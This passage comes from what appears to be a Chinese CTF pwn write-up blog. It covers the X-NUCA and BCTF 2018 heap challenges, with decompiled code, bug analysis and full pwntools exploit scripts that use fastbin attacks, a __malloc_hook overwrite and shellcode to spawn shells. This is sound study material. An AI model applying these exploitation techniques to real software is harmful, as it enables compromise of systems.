dup(0) ; PaddingLOAD:0000000000400010 dw 2 ; File type: ExecutableLOAD:0000000000400012 dw 3Eh ; Machine: x86-64LOAD:0000000000400014 dd 1 ; File versionLOAD:0000000000400018 dq offset _start ; Entry pointLOAD:0000000000400020 dq 40h here!!!!!!!!!!! ; PHT file offsetLOAD:0000000000400028 dq 2EB0h ; SHT file offsetLOAD:0000000000400030 dd 0 ; Processor-specific flagsLOAD:0000000000400034 dw 40h ; ELF header sizeLOAD:0000000000400036 dw 38h ; PHT entry sizeLOAD:0000000000400038 dw 9 ; Number of entries in PHTLOAD:000000000040003A dw 40h ; SHT entry sizeLOAD:000000000040003C dw 1Fh ; Number of entries in SHTLOAD:000000000040003E dw 1Ch ; SHT entry index for string table 在Program Header中找到一个Type为STACK的节区入口： 123456789LOAD:00000000004001C8 ; PHT Entry 7LOAD:00000000004001C8 dd 6474E551h ; Type: STACKLOAD:00000000004001CC dd 7 ; FlagsLOAD:00000000004001D0 dq 0 ; File offsetLOAD:00000000004001D8 dq 0 ; Virtual addressLOAD:00000000004001E0 dq 0 ; Physical addressLOAD:00000000004001E8 dq 0 ; Size in file imageLOAD:00000000004001F0 dq 0 ; Size in memory imageLOAD:00000000004001F8 dq 10h ; Alignment 其中Flags处对应的就是这一节区的权限，修改为6，去掉执行权限。 不知道这题还有其他什么办法利用？本想着off by one修改堆块的size，利用unlink修改数组内容，但是edit每次都要free再重新malloc，这种方法就没有成功。 利用脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445from pwn import *context.log_level='debug'context(arch='amd64')debug = 1def pwn(ip='127.0.0.1'): if debug: p = process('./hero') else: p = remote(ip,8089) def add(name,power): p.sendlineafter("Your choice: ",'1') p.sendafter("What's your hero's name:\n",name) p.sendafter("What's your hero's power:\n",power) def show(idx): p.sendlineafter("Your choice: ",'2') p.sendlineafter("What hero do you want to show?\n",str(idx)) def edit(idx,name,power): p.sendlineafter("Your choice: ",'3') p.sendlineafter("What hero do you want to edit?\n",str(idx)) p.sendafter("What's your hero's name:\n",name) p.sendafter("What's your hero's power:\n",power) def remove(idx): p.sendlineafter("Your choice: ",'4') p.sendlineafter("What hero do you want to remove?\n",str(idx)) def math(choice,a,b): p.sendlineafter("Your choice: ",'6') p.sendlineafter("4. Divide two numbers\n",str(choice)) p.sendlineafter("Please input two numbers to do math with\n",str(a)+" "+str(b)) name_addr = 0x602160 power_addr = 0x602100 payload = asm(shellcraft.sh()) add('000\n',payload) math(13,1,2) p.interactive()pwn() littlenote基本逻辑addnote添加note，其中notenum和note数组位于bss上。当询问是否保存note时，如果输入’N’则会重新分配一个0x20大小的块。 123456789101112131415161718192021222324252627unsigned __int64 addnote()&#123; __int64 v0; // rbx __int64 v1; // rbx char buf; // [rsp+0h] [rbp-20h] unsigned __int64 v4; // [rsp+8h] [rbp-18h] v4 = __readfsqword(0x28u); if ( (unsigned __int64)notenum &gt; 0xF ) puts("FULL"); v0 = notenum; note[v0] = (char *)malloc(0x60uLL); puts("Enter your note"); read(0, note[notenum], 0x60uLL); puts("Want to keep your note?"); read(0, &amp;buf, 7uLL); if ( buf == 78 ) &#123; puts("OK,I will leave a backup note for you"); free(note[notenum]); v1 = notenum; note[v1] = (char *)malloc(0x20uLL); &#125; ++notenum; puts("Done"); return __readfsqword(0x28u) ^ v4;&#125; shownote展示note内容。 1234567891011121314151617181920unsigned __int64 shownote()&#123; unsigned int v1; // [rsp+4h] [rbp-Ch] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts("Which note do you want to show?"); __isoc99_scanf("%u", &amp;v1); if ( v1 &lt; (unsigned __int64)notenum ) &#123; if ( note[v1] ) puts(note[v1]); puts("Done"); &#125; else &#123; puts("Out of bound!"); &#125; return __readfsqword(0x28u) ^ v2;&#125; freenote释放note[idx]对应的内存，但没有置零，UAF和double free 1234567891011121314151617181920unsigned __int64 freenote()&#123; unsigned int v1; // [rsp+4h] [rbp-Ch] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts("Which note do you want to delete?"); __isoc99_scanf("%u", &amp;v1); if ( v1 &lt; (unsigned __int64)notenum ) &#123; if ( note[v1] ) free(note[v1]); puts("Done"); &#125; else &#123; puts("Out of bound!"); &#125; return __readfsqword(0x28u) ^ v2;&#125; hacksys先输入name，然后调用hacker函数十次输入age，但这里的idx和age都由用户控制，如果idx为负数就会躲过检查，在栈上数组之前的位置随意写。 123456789101112131415161718192021222324252627282930313233343536373839404142434445__int64 hacksys()&#123; char s; // [rsp+0h] [rbp-20h] unsigned __int64 v2; // [rsp+18h] [rbp-8h] v2 = __readfsqword(0x28u); puts("Enter administrator's name:"); __isoc99_scanf("%9s", &amp;s); puts("\n--------------------"); puts("Welcome:"); puts("\n"); puts(&amp;s); puts("\n--------------------"); hacker(); return 0LL;&#125;unsigned __int64 hacker()&#123; signed int j; // [rsp+8h] [rbp-78h] signed int i; // [rsp+Ch] [rbp-74h] __int64 v3; // [rsp+10h] [rbp-70h] __int64 v4; // [rsp+18h] [rbp-68h] __int64 s[11]; // [rsp+20h] [rbp-60h] unsigned __int64 v6; // [rsp+78h] [rbp-8h] v6 = __readfsqword(0x28u); puts("Welcome to hacker's system\n"); puts("Now you can set hackers' age\n"); memset(s, 0, 0x50uLL); for ( i = 0; i &lt;= 9; ++i ) &#123; puts("Enter hacker index:"); __isoc99_scanf("%lld", &amp;v3); puts("Enter hacker age:"); __isoc99_scanf("%lld", &amp;v4); if ( v3 &gt; 9 ) exit(0); s[v3] = v4; &#125; puts("Now let's see your creation:'"); for ( j = 0; j &lt;= 9; ++j ) printf("%lld ", s[j]); return __readfsqword(0x28u) ^ v6;&#125; 漏洞及利用主要利用fastbin attack，修改fastbin中某一块内存的FD指针，使之指向stderr-0x3，这个位置开始的块，size字段能够对应到0x7f。通过将stderr-0x3分配出去后，修改note[0]，使之指向puts@got，再利用show泄露puts的地址。 同样的方式修改FD指向malloc_hook-0x23，修改malloc_hook为one_gadget。 栈中修改内存的方式暂时没有想出来如何利用QWQ 利用脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *context.log_level='debug'p = process('./littlenote')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')sys_plt = 0x400760stderr = 0x6020c0puts_got = 0x602020gadget=[0x45216,0x4526a]def add(note,keep='y'): p.sendlineafter("Your choice:\n",'1') p.sendlineafter("Enter your note\n",note) #read p.sendlineafter("Want to keep your note?\n",keep) def show(idx): p.sendlineafter("Your choice:\n",'2') p.sendlineafter("Which note do you want to show?\n",str(idx)) def free(idx): p.sendlineafter("Your choice:\n",'3') p.sendlineafter("Which note do you want to delete?\n",str(idx)) add("0gur1")add("1gur1")free(0) #fastbin-&gt;0free(1) #fastbin-&gt;1-&gt;0free(0) #fastbin-&gt;0-&gt;1-&gt;0add(p64(stderr-0x3))#fastbin-&gt;1-&gt;0-&gt;stderr-0x3add("3gur1")#fastbin-&gt;0-&gt;stderr-0x3add("4gur1")#fastbin-&gt;stderr-0x3add('a'*0x13+p64(puts_got))#note[0]=puts_gotshow(0)puts_addr = u64(p.recv(6).ljust(8,'\x00'))log.info("puts_addr:%#x",puts_addr)malloc_hook = puts_addr-(libc.symbols['puts']-libc.symbols['__malloc_hook'])log.info("malloc_hook:%#x",malloc_hook)one_gadget = puts_addr - libc.symbols['puts']+gadget[1]add("6gur1")add("7gur1")free(6) #fastbin-&gt;6free(7) #fastbin-&gt;7-&gt;6free(6) #fastbin-&gt;6-&gt;7-&gt;6 add(p64(malloc_hook-0x23))#fastbin-&gt;7-&gt;6-&gt;malloc_hook-0x23add("9gur1")#fastbin-&gt;6-&gt;malloc_hook-0x23add("agur1")#fastbin-&gt;malloc_hook-0x23add(0x13*'a'+p64(one_gadget))#gdb.attach(p)p.sendlineafter("Your choice:\n",'1')p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018 x-nuca pwn]]></title>
    <url>%2F2018%2F12%2F18%2F2018-x-nuca-pwn%2F</url>
    <content type="text"><![CDATA[个人赛catchme漏洞利用flag存放在data段中，可以利用canary的报错直接读出flag。 利用脚本12345678from pwn import *context.log_level='debug'p = process('./catch_me')p.sendlineafter("Your turn, show your flag:\n",'')payload ='a'*0x128+p64(0x600ca0)p.sendlineafter("Are you sure?\n",payload)p.interactive() note漏洞利用在add的scanf中指定了输入字符串的长度32，由于scanf会主动在末尾加\0，所以会在第33个字节处写入一个\0，造成null off by one漏洞。 题目中malloc的chunk只有0x8和0x20两种，且0x20的只能malloc一次。这个0x20可以用来调整地址的位置，如果name1指向了0x100，name2指向0x120，通过对content2的输入能够覆盖name2中的地址末位为\x00，即name2同样指向了0x100。这样在删除name1之后再对name2进行edit，就相当于与UAF，从而利用fastbin attack伪造一个fastbin指向command（0x602098）附近。0x602090这个位置是由用户控制的，可以把这个字段伪造成一个fastbin的size字段，进而将0x602098位置当做一个chunk分配给用户，覆写command为’/bin/sh’。 利用脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *context.log_level='debug'p=process('./note')cmd=0x602098def add(name,content): p.sendlineafter("please input the command:\n",'1') p.sendafter("block name:",name) p.sendafter("block content:",content)def f1234(name,content): p.sendlineafter("please input the command:\n",'1234') p.sendafter("input the secret name:",name) p.sendlineafter("please input the content:\n",content)def dele(idx): p.sendlineafter("please input the command:\n",'4') p.sendlineafter("please input the block id:",str(idx))def edit(idx,name,content): p.sendlineafter("please input the command:\n",'2') p.sendlineafter("please input the index you want to edit\n",str(idx)) p.sendafter("please input name:\n",name) p.sendlineafter("please input the content:\n",content) p.sendafter("Please leave your name :",'\x21\x00\x00\x00\x00')add('0gur1\n','content\n')#0-&gt;0x10add('1gur1\n','content\n')#1-&gt;0x30add('2gur1\n','content\n')#2-&gt;0x50add('3gur1\n','content\n')#3-&gt;0x70add('4gur1\n','content\n')#4-&gt;0x90add('5gur1\n','content\n')#5-&gt;0xb0f1234('secret\n','content\n')#0xd0add('6gur1\n','content\n')#6-&gt;0x100add('7gur1\n','1'*32)#7-&gt;0x120;change to #7-&gt;0x100dele(6)#fb-&gt;0x100edit(7,p64(cmd-0x10),'content\n')#fb-&gt;0x100-&gt;cmdadd('8gur1\n','content\n')#8-&gt;100add('/bin/sh\n','content\n')#9-&gt;cmdp.sendlineafter("please input the command:\n",'2333')p.interactive() 线下赛pwn4-library这题我的思路可能想复杂了，因为看见别的师傅发了wp，数据量不是很大，我可能绕弯了。毕竟是肝了一晚上的一道题（是的大佬们，你们一会就做出来的题我肝了一夜），还是纪念一下orz 基本逻辑程序将功能分为两大类：管理员和学生。管理员可以添加、删除以及检查书。 add_books添加一本书，需要创建三种结构体：book_node，section_head和section_node。一本书有多个章节，根据输入的num，创建多个section_node。 123456789101112131415161718struct book_node&#123; char title[16]; __int64 abs_title; struct section_head * section_addr; __int64 borrow; struct book_node * next;&#125;struct section_head&#123; __int64 section_num; struct section_node * section_list; __int64 type;&#125;struct section_node&#123; char name[8]; __int64 length; char *content; struct secion_node * next;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687unsigned __int64 add_books()&#123; …… v13 = __readfsqword(0x28u); v0 = (struct book_node *)malloc(0x30uLL); if ( !v0 ) exit(0); v1 = v0; v2 = head; v1-&gt;next = head-&gt;next; v2-&gt;next = v1; LODWORD(v1-&gt;borrow) = 0; v3 = (struct section_head *)malloc(0x18uLL); v4 = v3; if ( !v3 ) exit(0); v1-&gt;section_addr = v3; puts("title:"); v5 = read(0, tmp, 0x10uLL); LODWORD(v6) = v5; v7 = v5 - 1; if ( tmp[v7] == 10 ) tmp[v7] = 0; v8 = abs_int(tmp); LOBYTE(v1-&gt;abs_title) = v8; if ( v8 == 1 ) &#123; puts("Oh, it's a C book"); LODWORD(v1-&gt;section_addr-&gt;type) = 0; &#125; else if ( v8 == 2 ) &#123; puts("Oh, it's a MATH book"); LODWORD(v1-&gt;section_addr-&gt;type) = 1; &#125; else &#123; if ( v8 ) return __readfsqword(0x28u) ^ v13; puts("Oh, it's a English book"); LODWORD(v1-&gt;section_addr-&gt;type) = 0; &#125; v6 = (signed int)v6; strncpy(v1-&gt;title, tmp, (signed int)v6); v1-&gt;title[v6] = 0; puts("How many sections"); v9 = read_int(); LODWORD(v4-&gt;section_num) = v9; if ( v9 ) &#123; v10 = 0; do &#123; input_section(v1-&gt;section_addr); ++v10; &#125; while ( v9 != v10 ); &#125; ++LODWORD(head-&gt;num); return __readfsqword(0x28u) ^ v13;&#125;ssize_t __fastcall input_section(struct section_head *a1)&#123; …… v1 = (struct section_node *)malloc(0x20uLL); if ( !v1 ) exit(0); v2 = v1; v1-&gt;next = a1-&gt;section_list; a1-&gt;section_list = v1; puts("input section name"); v3 = (unsigned __int64)read(0, v2, 8uLL) - 1; if ( v2-&gt;name[v3] == 10 ) v2-&gt;name[v3] = 0; puts("what's the section length:"); v4 = read_int(); LODWORD(v2-&gt;length) = v4; v5 = (char *)malloc(v4); v2-&gt;content_addr = v5; if ( !v5 ) exit(0); if ( LODWORD(a1-&gt;type) == 1 ) LODWORD(v2-&gt;length) = 2 * v4; puts("what's the section content:"); return read(0, v2-&gt;content_addr, LODWORD(v2-&gt;length));// heap overflow ！！&#125; check_books检查title是否为空，abs_title和利用title计算出的abs值是否一致。 1234567891011121314151617181920212223242526272829int check_books()&#123; …… puts("check all books"); result = (signed int)head; for ( i = head-&gt;next; i; i = i-&gt;next ) &#123; if ( LODWORD(i-&gt;borrow) == 1 ) &#123; while ( 1 ) ; &#125; result = abs_int(i-&gt;title); v2 = result; if ( !i-&gt;title[0] ) &#123; *(_QWORD *)i-&gt;title = 'enifednu'; i-&gt;title[8] = 'd'; result = puts("The book's name is undefined"); &#125; if ( v2 != LOBYTE(i-&gt;abs_title) ) &#123; LOBYTE(i-&gt;abs_title) = v2; result = printf("Oh,%s is classified mistakenly\n", i);// leak address &#125; &#125; return result;&#125; dele_book将要删除的book_node从链表中解链并释放对应的book_node。 123456789101112131415161718192021222324252627282930313233343536373839unsigned __int64 dele_book()&#123; …… v5 = __readfsqword(0x28u); puts("title:"); v0 = (unsigned __int64)read(0, v4, 0x10uLL) - 1; if ( v4[v0] == 10 ) v4[v0] = 0; v1 = head-&gt;next; if ( v1 ) &#123; v2 = head-&gt;next; while ( strcmp(v4, v1-&gt;title) ) // cmp title &#123; v2 = v1; // v2:last node;v1:present node if ( !v1-&gt;next ) goto LABEL_11; v1 = v1-&gt;next; &#125; puts("delete success"); if ( head-&gt;next == v2 ) &#123; free(v1); head-&gt;next = 0LL; &#125; else &#123; v2-&gt;next = v1-&gt;next; free(v1); &#125; &#125; else &#123;LABEL_11: puts("Sorry,no such book"); &#125; return __readfsqword(0x28u) ^ v5;&#125; 学生可以借书、还书和读书。 borrow在book_node的链表中找到对应的书并把borrow字段置为1. 123456789101112131415161718192021222324252627282930unsigned __int64 borrow()&#123; …… v5 = __readfsqword(0x28u); puts("what's the book's title you want to borrow?"); v0 = (unsigned __int64)read(0, v4, 0x10uLL) - 1; if ( v4[v0] == 10 ) v4[v0] = 0; v1 = head; v2 = head-&gt;next; if ( v2 ) &#123; while ( strcmp(v4, v2-&gt;title) || LODWORD(v2-&gt;borrow) ) &#123; v2 = v2-&gt;next; if ( !v2 ) goto LABEL_8; &#125; LODWORD(v2-&gt;borrow) = 1; --LODWORD(v1-&gt;num); puts("borrow success"); &#125; else &#123;LABEL_8: puts("Sorry,Please borrow this book next time"); &#125; return __readfsqword(0x28u) ^ v5;&#125; back会检查section的数量，如果数量有问题就会释放book_node和对应的section_addr；否则将borrow置零。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152unsigned __int64 back()&#123; …… v8 = __readfsqword(0x28u); puts("what's the book's title you want to give back?"); v0 = (unsigned __int64)read(0, v7, 0x10uLL) - 1; if ( v7[v0] == 10 ) v7[v0] = 0; v1 = head; v2 = head-&gt;next; if ( v2 ) &#123; while ( strcmp(v7, v2-&gt;title) || LODWORD(v2-&gt;borrow) != 1 ) &#123; v2 = v2-&gt;next; if ( !v2 ) return __readfsqword(0x28u) ^ v8; &#125; v3 = v2-&gt;section_addr; v4 = v3-&gt;section_list; //统计section_list中的section数量 if ( v4 ) &#123; v5 = 0; do &#123; ++v5; v4 = v4-&gt;next; &#125; while ( v4 ); &#125; else &#123; v5 = 0; &#125; //比较实际的section数量是否和section_addr中的num相同 if ( LODWORD(v3-&gt;section_num) == v5 ) &#123; LODWORD(v2-&gt;borrow) = 0; ++LODWORD(v1-&gt;num); puts("OK, success!!!"); &#125; else &#123; printf("section lack!! MUST discard it!!", v2); free(v2-&gt;section_addr); // UAF free(v2); &#125; &#125; return __readfsqword(0x28u) ^ v8;&#125; read_book会输出name为’xnuca’的section的content，还允许向书中添加section。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253unsigned __int64 read_book()&#123; v11 = __readfsqword(0x28u); puts("what's the book's title you want to read at library?"); v0 = (unsigned __int64)read(0, buf, 0x10uLL) - 1; if ( buf[v0] == 10 ) buf[v0] = 0; v1 = head-&gt;next; if ( v1 ) &#123; while ( strcmp(buf, v1-&gt;title) ) &#123; v1 = v1-&gt;next; if ( !v1 ) return __readfsqword(0x28u) ^ v11; &#125; puts("reading..."); puts("reading..."); puts("reading..."); v2 = v1-&gt;section_addr-&gt;section_list; v3 = 0; for ( i = v2 == 0LL; v2; i = v2 == 0LL ) &#123; v5 = "xnuca"; v6 = 5LL; v7 = v2; do &#123;//逐字节比较name if ( !v6 ) break; v3 = v7-&gt;name[0] &lt; (const unsigned __int8)*v5; i = v7-&gt;name[0] == *v5; v7 = (struct section_node *)((char *)v7 + 1); ++v5; --v6; &#125; while ( i ); if ( (!v3 &amp;&amp; !i) == v3 ) &#123; printf(v2-&gt;content_addr, v7); // format string! puts("xnuca!xnuca!xnuca!"); &#125; v2 = v2-&gt;next; v3 = 0; &#125; puts("DO you want to take a note?"); read(0, &amp;v9, 2uLL); if ( (v9 &amp; 0xDF) == 0x59 ) input_section(v1-&gt;section_addr); &#125; return __readfsqword(0x28u) ^ v11;&#125; bugs线下的题目漏洞总是很多，利用方式也多样，这里列出我找到的一些洞（反正补过之后没再被打 1.input_section中，如果type==1，read时的第三个参数变成2*length，造成堆溢出。 2.check_books中，当abs_title和计算结果不一致时会输出该book_node的title，但如果没有\0，就能够一直输出，通过构造数据能够输出next字段的值，即泄露堆地址。 3.如果在read_books时能添section，那么在back时，这个book_node和对应的section_addr就会被释放，但没有对指针置零，导致UAF。 4.read_book中有一个格式化字符串漏洞，但是太明显了，估计很快会被补上，于是不打算用这个漏洞。 漏洞利用利用整体思路是利用fastbin attack将malloc_hook-0x23放入到fastbin中，进而覆写malloc_hook。因此需要0x70的块，但程序中唯一能够申请0x70大小的content并不会被释放，所以利用堆溢出修改size字段来伪造0x70的块，至少需要2块才能实现fastbin attack。 另外需要泄露libc的地址，进而得到malloc_hook的地址。泄露libc地址可以通过check_books中输出title来实现。如果能让book_node指向bss上的stdout，那么输出的title就是stdout的实际地址。为了让book_node指向stdout处，可以修改某一book_node的next字段为bss上的stdout地址。修改字段可以通过UAF漏洞，在back()函数释放book_node和section_addr后，再read_book()添加section，将有机会分配到刚释放的book_node，通过输入content覆写book_node各个字段即可。 在覆写book_node的过程中，为了其他功能正常进行，section_addr字段要填入正确的堆地址，因此在此之前还需要泄露一次堆地址。 最终利用思路是：利用check_book和UAF泄露堆地址-&gt;利用check_book和UAF泄露libc地址-&gt;利用fastbin attack覆写malloc_hook。 利用脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140from pwn import *gadget=[0x45216,0x4526a,0xf02a4,0xf1147]debug=1if debug: p = process('./library') libc= ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level='debug'def add(title,section_num,section_name,length,content): p.sendlineafter("4. exit\n",'1') p.sendlineafter("title:\n",title) p.sendlineafter("How many sections\n",str(section_num)) p.sendlineafter("input section name\n",section_name) p.sendlineafter("what's the section length:\n",str(length)) p.sendlineafter("what's the section content:\n",content)def check(): p.sendlineafter("4. exit\n",'2')def dele(title): p.sendlineafter("4. exit\n",'3') p.sendafter("title:\n",title) def read_book(title,flag1,flag2,section_name=0,length=0,content=0): data = 0 p.sendlineafter("4. exit\n",'3') p.sendlineafter("what's the book's title you want to read at library?\n",title) p.recvuntil("reading...\n"*3) if flag1: data = p.recvline()[:-1] if flag2: p.sendlineafter("DO you want to take a note?\n",'Y') p.sendlineafter("input section name\n",section_name) p.sendlineafter("what's the section length:\n",str(length)) p.sendafter("what's the section content:\n",content) else: p.sendlineafter("DO you want to take a note?\n",'N') return datadef borrow(title): p.sendlineafter("4. exit\n",'1') p.sendlineafter("what's the book's title you want to borrow?\n",title)def back(title): p.sendlineafter("4. exit\n",'2') p.sendlineafter("what's the book's title you want to give back?\n",title)p.sendlineafter("choose your id:\n",'0')add('book0',1,'xnuca',256,'%17$p')#add 0add('book1',1,'sec1',256,'chapter1')#add 1p.sendlineafter("4. exit\n",'4')#leak heap address#---------------------------------------------------------p.sendlineafter("choose your id:\n",'1')read_book('book1',0,1,'sec1',0x30,'chapter\n') #read_book 1 ;add sectionborrow('book1')back('book1') #free #1's book_node,section_headread_book('\x00',0,1,'sec1',0x38,'1'*40)#new content use #1's booknodep.sendlineafter("4. exit\n",'4')#----------------------------------------------------------p.sendlineafter("choose your id:\n",'0')check()p.recvuntil("Oh,")heap_addr = u64(p.recvuntil(' ')[:-1][40:].ljust(8,'\x00'))log.info('heap_addr:%#x',heap_addr)add('book2',1,'sec1',256,'chapter1')#add 2p.sendlineafter("4. exit\n",'4')#leak libc address#---------------------------------------------------------p.sendlineafter("choose your id:\n",'1')read_book('book2',0,1,'sec1',0x30,'chapter\n') #read_book 2 ;add sectionborrow('book2')back('book2') #free #2's book_node,section_headread_book('\x00',0,1,'sec1',0x38,'1'.ljust(16,'\x00')+p64(1)+p64(heap_addr)+p64(0)+p64(0x603150))#new content use #2's booknodep.sendlineafter("4. exit\n",'4')#----------------------------------------------------------p.sendlineafter("choose your id:\n",'0')check()p.recvuntil("Oh,")stdout = u64(p.recvuntil('\x7f').ljust(8,'\x00'))log.info('stdout:%#x',stdout)libc_addr = stdout-libc.symbols['_IO_2_1_stdout_']malloc_hook = libc_addr+libc.symbols['__malloc_hook']add('\x32',1,'xnuca',256,'%17$p')#add 0add('book1',1,'sec1',256,'1'*0x18+p64(0x21))#add 1add('\x32',1,'sec1',256,'1'*0x18+p64(0x21))#add 2add('book3',1,'sec1',256,'1'*0x18+p64(0x21))#add 3p.sendlineafter("4. exit\n",'4')#fastbin attack#---------------------------------------------------------p.sendlineafter("choose your id:\n",'1')read_book('book1',0,1,'sec1',0x30,'chapter') #read_book 1;add sectionborrow('book1')back('book1') #free #1's book_node,section_headread_book('\x32',0,1,'sec1',0x38,'1'.ljust(16,'\x00')+p64(1)+p64(heap_addr+0x7c0)+p64(1)+p64(0)*2+p64(0x71))#change #1 section_head's size to 0x71back('1')#fastbin 0x70-&gt;#1 section_head;fastbin 0x20-&gt;#1 section_headread_book('book3',0,1,'sec1',0x30,'chapter') #read_book 2;add sectionborrow('book3')back('book3') #free #3's book_node,section_headread_book('\x32',0,1,'sec1',0x38,'0'.ljust(16,'\x00')+p64(0)+p64(heap_addr+0xb00)+p64(1)+p64(heap_addr+0x7c0-0x40)+p64(0)+p64(0x71))back('0')back('chapter')#fastbin 0x70-&gt;#1 section_head-&gt;#3 section_head-&gt;#1 section_headread_book('\x00',0,1,'sec1',0x68,p64(malloc_hook-0x23))#fastbin 0x70-&gt;#3 section_head-&gt;#1 section_head-&gt;malloc_hook-0x23read_book('\x00',0,1,'sec1',0x68,'chapter')#fastbin 0x70-&gt;#1 section_head-&gt;malloc_hook-0x23read_book('\x00',0,1,'sec1',0x68,'chapter')#fastbin 0x70-&gt;malloc_hook-0x23read_book('\x00',0,1,'sec1',0x68,'a'*0x13+p64(libc_addr+gadget[1]))p.sendlineafter("4. exit\n",'4')p.sendlineafter("choose your id:\n",'0')p.sendlineafter("4. exit\n",'1')p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018bctf pwn]]></title>
    <url>%2F2018%2F11%2F29%2F2018bctf-pwn%2F</url>
    <content type="text"><![CDATA[easiest程序实现了简单的add和delete功能，还给了system(‘/bin/sh’)函数。 在delete时没有对指针置零，double free漏洞。 在17大佬的指点下看了一下fastbin的源码，发现fastbin在计算idx的时候，对size部分取的是四个字节： 1234567891011121314151617181920212223242526#define fastbin_index(sz) \ ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ())) &#123; idx = fastbin_index (nb); mfastbinptr *fb = &amp;fastbin (av, idx); mchunkptr pp = *fb; do &#123; victim = pp; if (victim == NULL) break; &#125; while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) != victim); if (victim != 0) &#123; //检查size，利用fastbin_index计算index，并与idx比较，但sz是unsigned int if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)) &#123; …… &#125; …… return p; &#125; &#125; 也就是如果找到一个后四字节为0x7f的位置，就能利用fastbin attack了。找到的这个位置是got表，覆写got表中函数地址为0x400946。 r3kapig的wp里则是修改了stdout指针，指向ptr-0x88的位置，那么vtable的位置对应于ptr-0x88+0xd8=ptr+0x50=ptr[10]，事先在ptr[10]中写入多个0x400946，作为vtable中的指针。震惊于伪造的_IO_FILE_plus结构体如何绕过各种检查，我理解的是：找一条最短的能够执行”call [rax+0x38]”的路径，满足最少的条件。 three这道题证明了，逻辑简单的题目利用很困难（逻辑复杂的题逆向又很困难ORZ 基本逻辑程序的逻辑很简单，三个功能：alloc，edit和delete。没有输出。本题控制了最多能申请三个块。 alloc函数，申请一个0x40大小的块，并输入内容。 12345678910111213int alloc()&#123; signed int i; // [rsp+Ch] [rbp-4h] for ( i = 0; i &lt;= 2 &amp;&amp; notes[i]; ++i ) ; if ( i == 3 ) return puts("Too many notes!"); printf("Input the content:"); notes[i] = malloc(0x40uLL); readn(notes[i], 64LL); return puts("Done!");&#125; edit函数，修改块中的内容。 123456789101112int edit()&#123; signed int v1; // [rsp+Ch] [rbp-4h] printf("Input the idx:"); v1 = getint(); if ( v1 &lt; 0 || v1 &gt; 2 || !notes[v1] ) return puts("No such note!"); printf("Input the content:"); readn(notes[v1], 64LL); return puts("Done!");&#125; delete函数，存在一点问题，如果没有输入’y’，就不对notes[i]置零，存在UAF/double free漏洞。 1234567891011121314151617181920212223unsigned __int64 delete()&#123; __int64 v1; // [rsp+0h] [rbp-10h] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); printf("Input the idx:"); LODWORD(v1) = getint(); if ( (signed int)v1 &gt;= 0 &amp;&amp; (signed int)v1 &lt;= 2 &amp;&amp; notes[(signed int)v1] ) &#123; free((void *)notes[(signed int)v1]); printf("Clear?(y/n):", v1); readn((char *)&amp;v1 + 6, 2LL); if ( BYTE6(v1) == 121 ) notes[(signed int)v1] = 0LL; puts("Done!"); &#125; else &#123; puts("No such note!"); &#125; return __readfsqword(0x28u) ^ v2;&#125; bugdelete函数中的UAF、double free漏洞。另外，给的libc版本是2.27，也就是bins中使用了tcache。虽然有UAF但是没有输出，所以泄露地址变得困难。 漏洞利用泄露地址释放一个块同时到unsortedbin和tcache中，释放到unsorted bin中的目的是获取libc相关的地址，释放到tcache则是为了利用类似于fastbin attack来修改FD指针。至于如何得到一个unsortedbin，稍稍有些复杂，思路就是在堆上伪造一个块，并能够操作size字段，使之size为0x91，然后释放7次该块，填满0x90大小的tcache。然后修改该块的大小为0x51，释放到tcache 0x50中，再修改块大小为0x91，释放时就能放入到unsorted bin中。这样，这个block既在unsortedbin里又在tcache里。 由于main_arena+88是libc中的地址，通过修改最后两字节能够修改tcache中FD的指向，但只有最后1.5个字节是固定的，剩下的0.5个字节就需要碰运气了。 新学到的一个思路：如果能够修改libc中stdout的_IO_write_base的值，由于puts会调用_IO_FILE_plus-&gt;vtable中的函数，从_IO_write_base中读数据。因此修改FD指向stdout，通过类似于fastbin attack的操作，将stdout这块交由用户输入，从而修改_IO_write_base 这里要补充一些关于puts函数的知识。在调用puts函数时，通过vtable调用了_IO_new_file_xsputn函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061621203 size_t1204 _IO_new_file_xsputn (FILE *f, const void *data, size_t n)1205 &#123;1206 const char *s = (const char *) data;1207 size_t to_do = n;1208 int must_flush = 0;1209 size_t count = 0;1210 1211 if (n &lt;= 0)1212 return 0;1213 /* This is an optimized implementation.1214 If the amount to be written straddles a block boundary1215 (or the filebuf is unbuffered), use sys_write directly. */1216 1217 /* First figure out how much space is available in the buffer. */1218 if ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))1219 &#123;1220 count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;1221 if (count &gt;= n)1222 &#123;1223 ……1233 &#125;1234 &#125;1235 else if (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)1236 count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; /* Space available. */1237 1238 /* Then fill the buffer. */1239 if (count &gt; 0)1240 &#123;1241 if (count &gt; to_do)1242 count = to_do;1243 f-&gt;_IO_write_ptr = __mempcpy 